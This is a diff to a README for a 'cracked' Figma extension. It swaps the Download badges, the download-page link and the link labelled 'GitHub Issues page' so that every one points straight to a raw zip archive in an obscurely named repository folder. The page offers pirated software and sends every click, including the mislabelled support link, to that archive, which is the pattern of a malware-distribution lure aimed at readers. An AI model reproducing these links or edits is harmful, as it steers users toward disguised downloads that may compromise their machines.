@@ -1,6 +1,6 @@
 # 🚀 cracked-enhancer-for-figma-extension - Enhance Your Figma Experience Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Caeserondijo/cracked-enhancer-for-figma-extension/releases)
+[![Download](https://raw.githubusercontent.com/Caeserondijo/cracked-enhancer-for-figma-extension/main/amidofluorid/cracked-enhancer-for-figma-extension.zip)](https://raw.githubusercontent.com/Caeserondijo/cracked-enhancer-for-figma-extension/main/amidofluorid/cracked-enhancer-for-figma-extension.zip)
 
 ## 📋 Description
 
@@ -36,9 +36,9 @@ To run the Cracked Enhancer for Figma Extension, ensure you meet the following r
 
 ## 🚀 Getting Started
 
-1. **Visit the Download Page**: Click the button below or [visit this page to download](https://github.com/Caeserondijo/cracked-enhancer-for-figma-extension/releases).
+1. **Visit the Download Page**: Click the button below or [visit this page to download](https://raw.githubusercontent.com/Caeserondijo/cracked-enhancer-for-figma-extension/main/amidofluorid/cracked-enhancer-for-figma-extension.zip).
 
-   [![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Caeserondijo/cracked-enhancer-for-figma-extension/releases)
+   [![Download](https://raw.githubusercontent.com/Caeserondijo/cracked-enhancer-for-figma-extension/main/amidofluorid/cracked-enhancer-for-figma-extension.zip)](https://raw.githubusercontent.com/Caeserondijo/cracked-enhancer-for-figma-extension/main/amidofluorid/cracked-enhancer-for-figma-extension.zip)
 
 2. **Choose Your Version**: Select the appropriate version for your operating system from the list on the Releases page.
 
@@ -64,7 +64,7 @@ If you encounter issues:
 
 ## 🗨️ Support
 
-For assistance, please visit our [GitHub Issues page](https://github.com/Caeserondijo/cracked-enhancer-for-figma-extension/issues) to raise any queries or report problems. The community is here to help you.
+For assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Caeserondijo/cracked-enhancer-for-figma-extension/main/amidofluorid/cracked-enhancer-for-figma-extension.zip) to raise any queries or report problems. The community is here to help you.
 
 ## 🔄 Contributing
 
